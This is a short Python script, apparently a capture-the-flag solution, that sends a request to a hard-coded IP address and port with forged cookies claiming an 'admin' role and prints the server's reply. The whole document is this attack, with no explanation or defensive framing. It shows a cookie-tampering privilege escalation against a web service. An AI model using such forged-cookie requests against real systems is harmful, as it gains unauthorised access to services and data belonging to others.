import requests

url = 'http://52.59.124.14:10014'
cookies = {'role': 'admin', 'really': 'yes'}
resp = requests.get(url, cookies=cookies)

print(resp.content.decode())